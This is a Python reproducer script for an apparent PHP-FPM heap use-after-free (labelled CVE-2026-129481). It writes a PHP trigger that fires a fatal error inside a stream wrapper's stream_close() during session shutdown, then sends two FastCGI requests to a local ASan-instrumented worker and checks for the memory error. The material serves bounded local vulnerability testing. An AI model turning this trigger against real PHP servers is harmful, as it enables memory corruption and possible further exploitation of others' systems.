#!/usr/bin/env python3
"""CVE-2026-129481 (GHSA-g3vh-838c-65v7) bounded loopback reproducer.

Incomplete fix for CVE-2026-109619: session shutdown is interrupted by a fatal
error in a user stream wrapper's stream_close(), leaving the recorded script
filename pointer live after the request heap is freed.  A second request on
the same worker frees the stale string -> ASan heap-use-after-free.

Two requests, one static FPM child, OPcache disabled, USE_ZEND_ALLOC=0 so the
stale pointer is an ASan-tracked malloc region.  Binds 127.0.0.1 only; no
external systems contacted.  Vendor reports UAF on 8.4.27 and 8.5.12.

Usage: python3 lab/repro/php2shell-cve129481-fpm.py <php-fpm-bin> [outdir] [port]
"""
import os
import pathlib
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import time

HERE = pathlib.Path(__file__).resolve().parent
CLIENT = HERE / 'php2shell-fpm-client.py'
SID = 'poc129481'
ASAN_MARK = ('AddressSanitizer', 'heap-use-after-free', 'ERROR: AddressSanitizer')

WORKER = r'''<?php
class FatalClose129481 {
    public $context;
    public function stream_open($path, $mode, $options, &$opened) { return true; }
    public function stream_read($n) { return ''; }
    public function stream_write($d) { return strlen($d); }
    public function stream_eof() { return true; }
    public function stream_seek($o, $w) { return false; }
    public function stream_tell() { return 0; }
    public function stream_stat() { return array(); }
    public function stream_close() {
        nonexistent_function_for_fatal_129481();
    }
}
stream_wrapper_register('fatalwrap', 'FatalClose129481');
session_start();
$_SESSION['stream'] = fopen('fatalwrap://x', 'r');
unset($_SESSION);            /* PS(http_session_vars) holds the last ref at final RSHUTDOWN */
/* no session_destroy(): fatal must fire in the FINAL RSHUTDOWN zval_ptr_dtor,
   so the bailout skips php_session_cleanup_filename() with no second pass */
echo "req1:done:" . getmypid() . "\n";
'''

CONTROL = '--control' in sys.argv


def worker_source():
    if CONTROL:
        return WORKER.replace('nonexistent_function_for_fatal_129481();', 'return true;')
    return WORKER

PROBE = r'''<?php
echo "probe:" . getmypid() . "\n";
'''

REUSE = r'''<?php
session_start();
echo "req2:done:" . getmypid() . "\n";
'''


def wait_port(port, tries=150):
    for _ in range(tries):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def fcgi(port, script, cookie=None):
    cmd = [sys.executable, str(CLIENT), str(port), str(script)]
    if cookie:
        cmd += ['--param', 'HTTP_COOKIE=PHPSESSID=' + cookie]
    cp = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        timeout=25)
    return cp.stdout.decode(errors='replace')


def main():
    fpm = pathlib.Path(sys.argv[1]).resolve()
    out = pathlib.Path(sys.argv[2] if len(sys.argv) > 2
                       else 'lab/build/evidence/w27-cve129481')
    port = int(sys.argv[3] if len(sys.argv) > 3 else 18170)
    out.mkdir(parents=True, exist_ok=True)
    d = pathlib.Path(tempfile.mkdtemp(prefix='cve129481-'))
    sess, www = d / 'sess', d / 'www'
    sess.mkdir(); www.mkdir()
    (www / 'worker.php').write_text(worker_source())
    (www / 'probe.php').write_text(PROBE)
    (www / 'reuse.php').write_text(REUSE)
    conf = f'''[global]
error_log = {d}/fpm-error.log
daemonize = no
log_level = notice
pid = {d}/fpm.pid
process_control_timeout = 2

[www]
listen = 127.0.0.1:{port}
pm = static
pm.max_children = 1
pm.max_requests = 0
catch_workers_output = yes
clear_env = no
env[USE_ZEND_ALLOC] = 0
env[USE_TRACKED_ALLOC] = 1
php_admin_value[opcache.enable] = 0
php_admin_value[memory_limit] = 16M
php_admin_value[max_execution_time] = 0
php_admin_value[display_errors] = 1
php_admin_value[log_errors] = 1
php_admin_value[error_reporting] = 32767
php_admin_value[html_errors] = 0
php_admin_value[session.save_path] = {sess}
php_admin_value[session.name] = PHPSESSID
php_admin_value[session.use_cookies] = 1
php_admin_value[session.use_strict_mode] = 0
php_admin_value[session.cache_limiter] =
'''
    (d / 'fpm.conf').write_text(conf)
    env = dict(os.environ)
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1',
               ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:allocator_may_return_null=1',
               UBSAN_OPTIONS='halt_on_error=1')
    cmd = [str(fpm), '-n', '-F', '-y', str(d / 'fpm.conf'),
           '-d', 'error_log=' + str(d / 'php-error.log')]
    log = out / 'cve129481.log'
    with (d / 'fpm-stdout.log').open('wb') as fo:
        gp = subprocess.Popen(cmd, env=env, stdout=fo, stderr=subprocess.STDOUT,
                              start_new_session=True)
        try:
            if not wait_port(port):
                raise RuntimeError('FPM never bound 127.0.0.1:%d' % port)
            base = fcgi(port, www / 'probe.php')
            req1 = fcgi(port, www / 'worker.php', cookie=SID)
            mid = fcgi(port, www / 'probe.php')
            req2 = fcgi(port, www / 'reuse.php', cookie=SID)
            time.sleep(1)
        finally:
            try:
                gp.wait(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(gp.pid, signal.SIGKILL)
                gp.wait()
    text = (d / 'fpm-stdout.log').read_text(errors='replace')
    extra = []
    for lf in ('fpm-error.log', 'php-error.log'):
        p = d / lf
        if p.exists():
            extra.append('\n=== %s ===\n%s' % (lf, p.read_text(errors='replace')[:4000]))
    (sess / ('sess_' + SID)).exists() and extra.append(
        '\n=== session file ===\n' + (sess / ('sess_' + SID)).read_text(errors='replace')[:500])
    log.write_text('build=%s label=129481 mode=%s\n' % (fpm, 'control' if CONTROL else 'attack') +
                   '=== baseline probe ===\n%s\n=== req1 (fatal in stream_close) ===\n%s\n'
                   '=== mid probe ===\n%s\n=== req2 (session reuse) ===\n%s\n'
                   '=== fpm stdout/stderr ===\n%s\n%s\n' %
                   (base, req1, mid, req2, text, '\n'.join(extra)))
    hit = [m for m in ASAN_MARK if m in text or m in '\n'.join(extra)]
    # A clean run keeps the same worker PID across all requests.
    import re
    pids = set(re.findall(r'(?:probe|req1|req2|done):(\d+)', base + req1 + mid + req2))
    print('label=129481 mode=%s build=%s' % ('control' if CONTROL else 'attack', fpm))
    print('pids=%s  asan_markers=%s' % (sorted(pids), hit))
    for line in log.read_text(errors='replace').splitlines():
        if any(m in line for m in ASAN_MARK) or 'SUMMARY:' in line or 'READ of size' in line:
            print('  ' + line[:220])
    print('log=%s' % log)
    print('VERDICT=' + ('UAF_OBSERVED' if hit else 'CLEAN_NO_UAF'))
    shutil.rmtree(d, ignore_errors=True)


if __name__ == '__main__':
    main()
